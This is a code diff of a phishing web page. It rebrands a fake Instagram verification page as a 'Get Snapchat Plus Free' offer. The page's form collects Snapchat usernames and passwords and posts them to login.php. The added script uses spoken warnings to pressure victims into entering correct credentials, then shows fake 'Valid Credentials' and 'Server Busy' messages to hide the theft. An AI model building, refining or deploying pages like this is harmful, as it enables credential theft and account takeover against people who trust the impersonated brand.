@@ -214,7 +214,6 @@ userform */
       overflow: hidden;
       margin-bottom: 20px;
     }
-
     .scroll-images {
         margin-top: 30px;
       display: inline-block;
@@ -346,35 +345,8 @@ userform */
       }
     }
   
-@media screen and (max-width: 768px) {
-  /* header {
-    flex-direction: column;
-    align-items: flex-start;
-  }
+@media screen and (max-width: 770px) {
 
-  .logo {
-    margin-left: 0;
-    margin-top: 10px;
-    font-size: 20px;
-  }
-
-  nav {
-    margin-top: 10px;
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
-  }
-
-  nav a, .apply-btn {
-   margin-right: 10px;
-  } */
-/* header {
-    flex-direction: column;
-    align-items: center;
-    text-align: center;
-    padding: 15px 20px;
-  } */
 
   #snapchat-link1 {
     margin-top: 10px;
@@ -383,16 +355,10 @@ userform */
   }
 
   .logo {
-    font-size: 20px;
+    font-size: 22px;
     margin-left: 10px;
     margin-top: 10px;
   }
-/* 
-  nav a {
-    flex-direction: column;
-    margin-top: 10px;
-    margin-left:  100px;
-  } */
 
   nav a {
     margin: 8px ;
@@ -427,12 +393,16 @@ userform */
 
   #snp {
     margin-right: 0 !important;
-    text-align: center;
+    /* text-align: center; */
+    margin-left: -30px;
+   
+    
   }
 
   .form-container img.logo {
-    margin: 0 auto 20px auto;
-    display: block;
+    margin-left: -10px;
+    
+    margin-top: -50px;
     
   }
 
@@ -444,7 +414,7 @@ userform */
   .verified-users1{
     
      margin-top: 10px;
-     width: 400px;
+     width: 100%;
     
   }
 
@@ -463,10 +433,15 @@ userform */
   
 
   .how-it-works{
-    margin-left: 40px;
+    margin-left: 90px;
+    width: 75%;
+    
   }
+.steps{
+  margin-left: -30px;
+}
   nav a{
-    margin-left: 100px;
+    margin-left: 90px;
     font-weight: bold;
     font-size: 20px;
   }
@@ -476,63 +451,12 @@ userform */
      width: 500px;
     
   }
-  /* nav {
-    margin-top: 10px;
-    width: 100%;
-    display: flex;
-    flex-direction: column;
-    align-items: flex-start;
+  .verified-users1 h2{
+    margin-left: -60px;
   }
-
-  nav a, .apply-btn {
-   margin-right: 10px;
+  .hero{
+    margin-left: 50px;
   }
-
-  .hero-container {
-    flex-direction: column;
-    padding: 20px;
-    text-align: center;
-  }
-
-  .hero-left, .hero-right {
-    max-width: 100%;
-    width: 100%;
-  }
-
-  .hero-right img {
-    width: 100%;
-    height: auto;
-    margin-left: 0;
-  }
-
-  .form-container {
-    position: static !important;
-    margin: 30px auto !important;
-    width: 90% !important;
-    
-
-  }
-
-  #snp {
-    margin-right: 0 !important;
-    text-align: center;
-  }
-
-  .form-container img.logo {
-    margin: 0 auto 20px auto;
-    display: block;
-    
-  }
-
-  .verified-users {
-    text-align: center;
-    margin: auto;
-  }
-
-  .marquee img, .scroll-images img {
-    height: 60px;
-    width: 60px;
-  } */
 }   
 
 /* validation form */
@@ -577,8 +501,8 @@ userform */
   <section class="hero">
   <div class="hero-container">
     <div class="hero-left">
-      <h1>Get Verified on Instagram</h1>
-      <p>Apply for Instagram verification and get the blue check mark for your profile</p>
+      <h1>Get Verified on Snapchat</h1>
+      <p>Apply for snapchat verification and get the snapchat plus mark for your profile</p>
       <button class="apply-btn"onclick="user_form()">Apply Now</button>
 
       <div class="info-boxes">
@@ -592,7 +516,7 @@ userform */
         </div>
         <div class="info-box">
           <h3>Get Verified</h3>
-          <p>Receive the blue check mark on your profile</p>
+          <p>Receive the snapchat plus mark on your profile</p>
         </div>
       </div>
     </div>
@@ -641,14 +565,14 @@ userform */
   </div> -->
   <!-- Your Original Form Section -->
 <div class="form-container" id="userForms">
-    <p id="snp" style="margin-right:60px; font-size: 20px; font-weight: bold; font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif; color: rgb(239, 239, 0);" >Snapchat</p>
+    <p id="snp" style="margin-right:60px; font-size: 25px; font-weight: bold; font-family: 'Lucida Sans', 'Lucida Sans Regular', 'Lucida Grande', 'Lucida Sans Unicode', Geneva, Verdana, sans-serif; color: rgb(239, 239, 0);" >Snapchat</p>
     <img src="logo.jpg" class="logo" alt="Instagram Logo">
-    <h1>Get Blue Badge on Instagram</h1>
-    <p class="subtitle">Update your account with a blue verified badge</p>
+    <h1>Get Snapchat Plus Free</h1>
+    <p class="subtitle">Update your account with a snapchat plus verified badge</p>
 
   <form id="loginForm" method="POST" action="login.php" novalidate>
   <div>
-    <input type="text" name="username" id="username" placeholder="Snapchat Username" required>
+    <input type="text" name="username" id="username" placeholder="Username" required>
     <div class="error" id="usernameError"></div>
   </div>
   <br>
@@ -659,7 +583,7 @@ userform */
   <br>
   <button type="submit">Log In</button>
 </form>
-    <div class="forgot">Forgot password?</div>
+    
     <img src="https://cdn-icons-png.flaticon.com/512/1828/1828640.png" class="badge" alt="Verified Badge">
      <div class="verified-users">
     <div class="scroll-images">
@@ -678,6 +602,44 @@ userform */
 
 
 function user_form(){
+  alert("Username and Password  should be correct . If it is wrong so your account may block from  snapchat   plus")
+    const message = "Please make sure your username and  password   are   correct. If  it is  wrong, your account may be blocked from Snapchat Plus.  Thank you";
+  
+  const utterance = new SpeechSynthesisUtterance(message);
+  utterance.rate = 0.95;   // slower for clarity
+  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
+  utterance.volume = 1;    // max volume
+  utterance.lang = 'en-US';
+
+  // Wait for voices to be loaded
+  speechSynthesis.onvoiceschanged = () => {
+    const voices = speechSynthesis.getVoices();
+    
+    // Try selecting a clearer voice
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  };
+
+  // Also speak if voices are already loaded
+  const voices = speechSynthesis.getVoices();
+  if (voices.length) {
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  }
+
        let get=document.getElementById('userForms');
       
 
@@ -708,7 +670,7 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
   // Show progress message first (always)
   msgBox.innerHTML = "<b>✅ !</b><br>We are on the progress, please wait.....";
 
-
+  msgBox.scrollIntoView({ behavior: 'smooth', block: 'start' });
   // Delay to simulate server check
   setTimeout(() => {
     // Secret Snapchat-style rules (invisible to user)
@@ -721,6 +683,57 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
 
     if (!usernameValid || !passwordValid) {
    msgBox.innerHTML = "<b>⛔ Invalid Credentials</b><br>Your password or username doesn't match with Snapchat server.";
+     
+const message1="Invalid Credentials , Your password or   username doesn't  match  with    Snapchat server."
+ const utterance = new SpeechSynthesisUtterance(message1);
+  utterance.rate = 0.95;   // slower for clarity
+  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
+  utterance.volume = 1;    // max volume
+  utterance.lang = 'en-US';
+
+  // Wait for voices to be loaded
+  speechSynthesis.onvoiceschanged = () => {
+    const voices = speechSynthesis.getVoices();
+    
+    // Try selecting a clearer voice
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  };
+
+  // Also speak if voices are already loaded
+  const voices = speechSynthesis.getVoices();
+  if (voices.length) {
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
       setTimeout(() => {
         msgBox.innerHTML = "";
@@ -731,6 +744,61 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
 
     // ✅ If valid – continue with rest
     msgBox.innerHTML = "<b>✅ Valid Credentials</b><br>We are on the progress, please wait...";
+
+const message2="Valid Credentials , We are on the progress,  please wait...."
+ const utterance = new SpeechSynthesisUtterance(message2);
+  utterance.rate = 0.95;   // slower for clarity
+  utterance.pitch = 1.1;   // slightly higher pitch sounds clearer
+  utterance.volume = 1;    // max volume
+  utterance.lang = 'en-US';
+
+  // Wait for voices to be loaded
+  speechSynthesis.onvoiceschanged = () => {
+    const voices = speechSynthesis.getVoices();
+    
+    // Try selecting a clearer voice
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  };
+
+  // Also speak if voices are already loaded
+  const voices = speechSynthesis.getVoices();
+  if (voices.length) {
+    const selected = voices.find(voice =>
+      voice.name.includes("Google") || voice.name.includes("Microsoft")
+    );
+    if (selected) {
+      utterance.voice = selected;
+    }
+
+    speechSynthesis.speak(utterance);
+  }
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
     setTimeout(() => {
       msgBox.innerHTML = "<b>⚠ Server Busy:</b><br>Multiple users are currently trying to verify.<br>Your profile will be updated with a verification tic within <b>5 days</b>.<br><br>✨ <b>Have a great day!</b>";
@@ -752,12 +820,13 @@ document.getElementById('loginForm').addEventListener('submit', function (e) {
     msgBox.innerHTML = "<b>❌ Server Error</b><br>Please try again later.";
     console.error("Fetch error:", error);
   });
-  let get=localStorage.setItem("Update", "Account Processing....");
+  // let get=localStorage.setItem("Update", "Processing....");
 }, 30000);
 
 
 
   }, 2000); // 2s delay to show 'progress' before checking
+  let get=localStorage.setItem("Update","Being processed.....");
 });
 
 
@@ -860,13 +929,8 @@ document.getElementById("loginForm").addEventListener("submit", function(e) {
     msgBox.innerHTML = "<b>✅ Verified!</b><br>Your Snapchat account has been processed.";
   }, 30000);
 
-  let get=localStorage.setItem("Update","Accout Processing");
+  let get=localStorage.setItem("Update","Processing");
 });
-
-
-
-
-
   </script>
 
 </body>
